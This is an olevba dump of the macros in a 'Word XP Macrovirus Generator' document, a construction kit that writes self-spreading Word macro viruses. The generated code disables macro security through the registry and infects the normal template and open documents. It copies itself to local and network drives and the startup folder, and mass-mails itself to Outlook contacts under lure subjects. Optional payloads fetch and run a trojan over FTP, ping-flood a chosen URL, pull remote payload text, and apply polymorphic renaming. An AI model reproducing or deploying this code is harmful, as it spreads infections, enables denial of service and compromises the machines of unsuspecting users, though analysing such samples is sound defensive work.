olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Constructor.MSWord.NWXPG
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Constructor.MSWord.NWXPG - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO greets.frm 
in file: Constructor.MSWord.NWXPG - OLE stream: 'Macros/VBA/greets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub UserForm_Click()
Assistant.Visible = True
With Assistant.NewBalloon
   .Icon = msoIconAlert
     .Text = "I hope not to forget anybody!?"
   .Heading = "Sorry people!"
    .Animation = msoAnimationCheckingSomething
   .Show
 End With
   MsgBox "ID&T Rules!!!;o)", 64, "Yo,eat this..."
Assistant.Visible = False
  greets.Hide
  End Sub
-------------------------------------------------------------------------------
VBA MACRO nwxpg.bas 
in file: Constructor.MSWord.NWXPG - OLE stream: 'Macros/VBA/nwxpg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'~~~Word XP Macrovirus Generator~~~
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'~~~~~~~~~ (k)opywrong by ~~~~~~~~~
'~~~~Necronomikon [ZeroGravity]~~~~
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Public one As Integer
Public plugin As String
Public URL1 As String
Public user As String
Public pass As String
Public dir As String
Public file As String

Sub AutoOpen()
ShowVisualBasicEditor = False
Application.Caption = "Word XP Macrovirus Generator (c)by Necronomikon[Zer0Gravity]"
Application.WindowState = wdWindowStateMinimize
welcome.Show
End Sub
Sub Mainprog()
On Error Resume Next
Randomize
var1$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22)))
var2$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22)))
var3$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22)))
var4$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22)))
var5$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22)))
var6$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22)))

VirusName = mainfrm.tb1
Viriis = "" & mainfrm.tb1 & "" & ".cls"
VirusName = mainfrm.tb1
Open Viriis For Output As #1
Print #1, "Attribute VB_Name = """; mainfrm.tb1

Print #1, "Private Sub Document_Open()"
Print #1, "On Error Resume Next"
Print #1, "'This Word XP virus was created using NWXPG"
Print #1, "'code by Necronomikon/[Zer0Gravity]"
Print #1, "CommandBars(""Macro"").Controls(""Security..."").Enabled = False"
Print #1, "System.PrivateProfileString(""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"", ""Level"") = 1&"
Print #1, "If System.PrivateProfileString(""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"", ""AccessVBOM"") <> 1& Then"
Print #1, "Application.AutomationSecurity = msoAutomationSecurityForceDisable"
Print #1, "System.PrivateProfileString(""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM"") = 1&"
Print #1, "win = Environ(""windir"")"
Print #1, "docz = win & ""\re.doc"""
Print #1, "" & var1$ & " = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "" & var2$ & " = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> ""pri"" Then"
Print #1, "Set " & var3$ & " = ActiveDocument.VBProject.VBComponents.Item(1)"
Print #1, "" & var4$ & " = True"
Print #1, "End If"
Print #1, "If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> ""pri"" Then"
Print #1, "Set " & var3$ & " = NormalTemplate.VBProject.VBComponents.Item(1)"
Print #1, "" & var5$ & " = True"
Print #1, "ActiveDocument.Saved = True"
Print #1, "End If"
Print #1, "If GetAttr(ActiveDocument.FullName) = 1 Then"
Print #1, "SetAttr ActiveDocument.FullName, 0"
Print #1, "ActiveDocument.Reload"
Print #1, "End If"
Print #1, "If " & var5$ & " <> True And " & var4$ & " <> True Then GoTo " & var6$ & ""
Print #1, "If " & var5$ & " = True Then " & var3$ & ".CodeModule.AddFromString (""Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, "& var1$ &" - 1) & vbCr & """Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub""""); """
Print #1, "If " & var4$ & " = True Then " & var3$ & ".CodeModule.AddFromString (""Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, "& var2$ &" - 4); "); """
Print #1, "" & var6$ & ":"
Print #1, "If " & var2$ & " <> 0 And " & var1$ & " = 0 And (InStr(1, ActiveDocument.Name, ""Document"") = False) Then"
Print #1, "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName"
Print #1, "ElseIf (InStr(1, ActiveDocument.Name, ""Document"") <> False) Then"
Print #1, "SetAttr ActiveDocument.FullName, 1"
Print #1, "ActiveDocument.Saved = True: End If"
If payloads.chkpoly = True Then
Print #1, "OurCode = NPE(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, _"
Print #1, "ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines))"
End If
'taken from Four elephants on a tortoise!
'(An essay about advanced VBx) by jackie
If one = True Then
Print #1, "Set objNET = CreateObject(""InternetExplorer.Application"")"
Print #1, "Do While objNET.Busy"
Print #1, "VBA.DoEvents"
Print #1, "Loop"
Print #1, "objNET.Visible = 0"
Print #1, "objNET.Navigate """ & URL1 & """"
Print #1, "Do While objNET.ReadyState <> 4"
Print #1, "VBA.DoEvents"
Print #1, "Loop"
Print #1, "scode = objNET.Document.Body.innerText"
Print #1, "objNET.Quit"
End If

If payloads.optftp = True Then
Print #1, "Open ""c:\nec.ftp"" For Output As #1"
Print #1, "Print #1, ""open " & ftp.ftp1 & ""
Print #1, "Print #1, """ & ftp.user & """"
Print #1, "Print #1, """ & ftp.pass & """"
Print #1, "Print #1, ""cd /" & ftp.dir & "/"
Print #1, "Print #1, ""hash"
Print #1, "Print #1, ""bin"
Print #1, "Print #1, ""prompt"
Print #1, "Print #1, ""lcd c:\"
Print #1, "Print #1, ""mget " & ftp.file & ""
Print #1, "Print #1, ""bye"
Print #1, "Close #1"
Print #1, "Shell ""c:\windows\ftp.exe -s:c:\nec.ftp"", vbHide '"""
End If

If payloads.optping = True Then
Print #1, "Shell "" ping -l 50000 -t " & URL1 & """, vbHide '"""""
End If

'Plugin Payload / Thanks to WalruS
    If chkplugin.Value = True Then
    Print #1, plugin
End If
Print #1, "Call network"
Print #1, "End Sub"
Print #1, "Sub infect(drive)"
Print #1, "On Error Resume Next"
Print #1, "Dim s, f"
Print #1, "Set s = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "Set f = s.GetFile(""c:\WINDOWS\necro.mp3"")"
Print #1, "f.Copy (drive & ""\pussy.com"")"
Print #1, "f.Copy (drive & ""\windows\startm~1\programs\startup\msdos.com"")"
Print #1, "End Sub"
Print #1, "Function ShowDriveType(drvpath)"
Print #1, "On Error Resume Next"
Print #1, "Dim fso, d, t"
Print #1, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "Set d = fso.GetDrive(drvpath)"
Print #1, "Select Case d.DriveType"
Print #1, "Case 0: t = ""Unknown"""
Print #1, "Case 1: t = ""Removable"""
Print #1, "Case 2: t = ""Fixed"""
Print #1, "Case 3: t = ""Network"""
Print #1, "Case 4: t = ""CD-ROM"""
Print #1, "Case 5: t = ""RAM Disk"""
Print #1, "End Select"
Print #1, "If t = """" Then t = ""None"""
Print #1, "ShowDriveType = t"
Print #1, "End Function"
Print #1, "Sub network()"
Print #1, "On Error Resume Next"
Print #1, "Dim n, l, d3, drv"
Print #1, "For n = 65 To 90"
Print #1, "l = Chr(n)"
Print #1, "drv = l & "":"""
Print #1, "d3 = ShowDriveType(drv)"
Print #1, "If d3 = ""Fixed"" Then infect (drv)"
Print #1, "If d3 = ""Network"" Then infect (drv)"
Print #1, "Next n"
Print #1, "End Sub"
Rem taken from Word97/2K/XP.Tijor by Ultras[MATRiX]
Print #1, "Sub AutoClose()"
Print #1, "On Error Resume Next"
Print #1, "rem taken from Word97/2K/XP.Tijor by Ultras[MATRiX]"
Print #1, "Dim win, packIt"
Print #1, "win = Environ(""windir"")"
Print #1, "packIt = UUEncode(win & ""\re.doc"", win & ""\"" & """" & Application.UserName & """" & "".uue"")"
Print #1, "Set OutlookApp = CreateObject(""Outlook.Application"")"
Print #1, "Set MAPIuz = OutlookApp.GetNameSpace(""MAPI"")"
Print #1, "If System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\nwxpg\"", ""nwxpg"") <> ""by Necronomikon[Zerogravity]"" Then"
Print #1, "If OutlookApp = ""Outlook"" Then"
Print #1, "MAPIuz.Logon ""profile"", ""password"""
Print #1, "For Address = 1 To MAPIuz.AddressLists.Count"
Print #1, "Set AddyBook = MAPIuz.AddressLists(Address)"
Print #1, "countz = 1"
Print #1, "Set Guan0utlook = OutlookApp.CreateItem(0)"
Print #1, "For mmez = 1 To AddyBook.AddressEntries.Count"
Print #1, "AddBZ = AddyBook.AddressEntries(countz)"
Print #1, "Guan0utlook.Recipients.Add AddBZ"
Print #1, "countz = countz + 1"
Print #1, "If countz > 30 Then oo = AddyBook.AddressEntries.Count"
Print #1, "Next mmez"
Print #1, "Randomize"
Print #1, "numberz = Int(Rnd * 9) + 1"
Print #1, "If numberz = 1 Then mez$ = ""Read this..."
Print #1, "If numberz = 2 Then mez$ = """" & Application.UserName & "" :)"
Print #1, "If numberz = 3 Then mez$ = ""Unpack it."
Print #1, "If numberz = 4 Then mez$ = ""New story"
Print #1, "If numberz = 5 Then mez$ = ""Re:"
Print #1, "If numberz = 6 Then mez$ = ""Important Info"
Print #1, "If numberz = 7 Then mez$ = ""This is interesting..."
Print #1, "If numberz = 8 Then mez$ = ""Look what I found..."
Print #1, "If numberz = 9 Then mez$ = ""Check this out..."
Print #1, "Guan0utlook.Subject = mez$"
Print #1, "Guan0utlook.Body = mez$"
Print #1, "Guan0utlook.Attachments.Add win & ""\"" & """" & Application.UserName & """" & "".uue"
Print #1, "Guan0utlook.Send"
Print #1, "AddBZ = """
Print #1, "Next Address"
Print #1, "MAPIuz.Logoff"
Print #1, "End If"
Print #1, "If System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\nwxpg\"", ""nwxpg"") <> ""by Necronomikon[Zerogravity]"" Then"
Print #1, "End If"
Print #1, "End Sub"
Print #1, "Function Encode(sDa As String) As String"
Print #1, "Dim szOut As String"
Print #1, "Dim nChar As Integer"
Print #1, "Dim i As Integer"
Print #1, "If Len(sDa) Mod 3 <> 0 Then sDa = sDa & Space(3 - Len(sDa) Mod 3)"
Print #1, "For i = 1 To Len(sDa) Step 3"
Print #1, "szOut = szOut & Chr(Asc(Mid(sDa, i, 1)) \ 4 + 32)"
Print #1, "szOut = szOut & Chr((Asc(Mid(sDa, i, 1)) Mod 4) * 16 + Asc(Mid(sDa, i + 1, 1)) \ 16 + 32)"
Print #1, "szOut = szOut & Chr((Asc(Mid(sDa, i + 1, 1)) Mod 16) * 4 + Asc(Mid(sDa, i + 2, 1)) \ 64 + 32)"
Print #1, "szOut = szOut & Chr(Asc(Mid(sDa, i + 2, 1)) Mod 64 + 32)"
Print #1, "Next i"
Print #1, "Encode = szOut"
Print #1, "End Function"
Print #1, "Function UUEncode(fileIn As String, fileOut As String) As Integer"
Print #1, "Dim nFi As Integer, nFo As Integer"
Print #1, "Dim indx As Integer, sDa As String"
Print #1, "Dim lbytei As Long, lfull As Long, lmaxl As Long"
Print #1, "On Error GoTo ERR_UUEncode"
Print #1, "nFi = FreeFile"
Print #1, "Open fileIn For Binary As nFi"
Print #1, "lbytei = LOF(nFi)"
Print #1, "nFo = FreeFile"
Print #1, "Open fileOut For Output As nFo"
Print #1, "For indx = Len(fileIn) - 1 To 1 Step -1"
Print #1, "If Mid$(fileIn, indx, 1) = ""\"" Then"
Print #1, "fileIn = Mid$(fileIn, indx + 1)"
Print #1, "Exit For"
Print #1, "End If"
Print #1, "Next"
Print #1, "Print #nFo, ""begin 644 "" & fileIn"
Print #1, "lfull = lbytei \ 45"
Print #1, "sDa = Space(45)"
Print #1, "While lfull > 0"
Print #1, "Get nFi, , sDa"
Print #1, "Print #nFo, ""M"" & Encode(sDa)"
Print #1, "lfull = lfull - 1"
Print #1, "DoEvents"
Print #1, "Wend"
Print #1, "sDa = Space(lbytei Mod 45)"
Print #1, "Get nFi, , sDa"
Print #1, "Print #nFo, Chr(Len(sDa) + 32) & Encode(sDa)"
Print #1, "Print #nFo, ""end"""
Print #1, "Close nFi"
Print #1, "Close nFo"
Print #1, "ERR_UUEncode:"
Print #1, "Close nFi"
Print #1, "Close nFo"
Print #1, "Exit Function"
Print #1, "End Function"

'Necronomikon's Polymorph Engine
If payloads.chkpoly = True Then
Print #1, "Private Function NPE(poly)"
Print #1, "Rem Necronomikon's Polymorph Engine"
Print #1, "Dim VaR(6): On Error Resume Next: Randomize"
Print #1, "VaR(1) = ""poly"": VaR(2) = ""NPE"": VaR(3) = ""VaR"": VaR(4) = ""nec"
Print #1, "VaR(5) = ""morph"": VaR(6) = ""NewVar"
Print #1, "For nec = 1 To 6"
Print #1, "nec_nec = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)& Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)"
Print #1, "While InStr(1, poly, VaR(nec), vbTextCompare)"
Print #1, "morph = InStr(1, poly, VaR(nec), vbTextCompare)"
Print #1, "poly = Mid(poly, 1, morph - 1) & NewVar & Mid(poly, morph + Len(VaR(nec)), Len(poly) - morph)"
Print #1, "Wend"
Print #1, "Next"
Print #1, "NPE = poly"
Print #1, "End Function"
End If
Close #1
MsgBox "Macro Virus " & mainfrm.tb1 & " Created Successfully!", vbCritical + vbOKOnly, "NWXPG"
End Sub

-------------------------------------------------------------------------------
VBA MACRO welcome.frm 
in file: Constructor.MSWord.NWXPG - OLE stream: 'Macros/VBA/welcome'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub UserForm_Click()
welcome.Hide
mainfrm.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO author.frm 
in file: Constructor.MSWord.NWXPG - OLE stream: 'Macros/VBA/author'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub UserForm_Click()
author.Hide
End Sub
-------------------------------------------------------------------------------
VBA MACRO mainfrm.frm 
in file: Constructor.MSWord.NWXPG - OLE stream: 'Macros/VBA/mainfrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton2_Click()
mainfrm.Hide
about.Show
End Sub

Private Sub CommandButton3_Click()
Call Mainprog
mainfrm.Hide
Application.Quit
End Sub

Private Sub CommandButton4_Click()
Application.Quit
End Sub

Private Sub CommandButton5_Click()
payloads.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO payloads.frm 
in file: Constructor.MSWord.NWXPG - OLE stream: 'Macros/VBA/payloads'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub chkpoly_Click()
End Sub
Private Sub CommandButton1_Click()
payloads.Hide
End Sub
Private Sub optftp_Click()
ftp.Show
End Sub
Private Sub optown_Click()
frmPlugin.Show
End Sub

Private Sub optping_Click()
If optping.Value = True Then ping = 1
ping = True
Do
    URL1 = InputBox("Enter the URL you want to dos:", "Word XP Macrovirus Construction Kit", "http://www.microsoft.com/")
    Loop While URL1 = ""
    If optping.Value = False Then ping = 0

End Sub

Private Sub optwww_Click()
If optwww.Value = True Then one = 1
one = True
Do
    URL1 = InputBox("Enter the URL to download payloadtext:", "Word XP Macrovirus Construction Kit", "http://www.yourURL.com/payload.txt")
    Loop While URL1 = ""
    If optwww.Value = False Then one = 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmPlugin.frm 
in file: Constructor.MSWord.NWXPG - OLE stream: 'Macros/VBA/frmPlugin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


'Thanks WalruS for this piece of code...!!!;o)
Private Sub back_Click()
plugin = TextBox1.Text
frmPlugin.Hide
End Sub
Private Sub clear_Click()
TextBox1.Text = ""
End Sub

Private Sub TextBox1_Change()

End Sub
-------------------------------------------------------------------------------
VBA MACRO ftp.frm 
in file: Constructor.MSWord.NWXPG - OLE stream: 'Macros/VBA/ftp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
ftp.Hide
End Sub

Private Sub Label3_Click()

End Sub

Private Sub TextBox1_Change()

End Sub
-------------------------------------------------------------------------------
VBA MACRO about.frm 
in file: Constructor.MSWord.NWXPG - OLE stream: 'Macros/VBA/about'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
author.Show
End Sub

Private Sub CommandButton2_Click()
vck.Show
End Sub

Private Sub CommandButton3_Click()
greets.Show
End Sub

Private Sub CommandButton4_Click()
about.Hide
mainfrm.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO vck.frm 
in file: Constructor.MSWord.NWXPG - OLE stream: 'Macros/VBA/vck'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Image1_Click()

End Sub

Private Sub Label1_Click()

End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/about/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Author@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/about/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/about/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�About VCK�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/about/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/about/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Greets@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/about/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/about/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Close
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/about/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Enter Your Payload Code Below Using Shift + Enter For Next Line. �N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Balloon
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MsgBox "Thanks WalruS for this piece of code...!;)", 48,"NWXPG"L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Back�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Balloon
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Clear
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Balloon
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Dont Enter Sub Code! eg "Sub Payload", "End Sub", Or "On Error Resume Next"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/frmPlugin/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Balloon
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
necronomikon
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
password
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
your-dir-here�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
trojan.exeL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Username:�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Password:�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Directory:L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Filename:�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Close
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ftp.necro.net�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FTP:D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/ftp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�jackie@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Gigabyteq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.NWXPG' - OLE stream: 'Macros/greets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
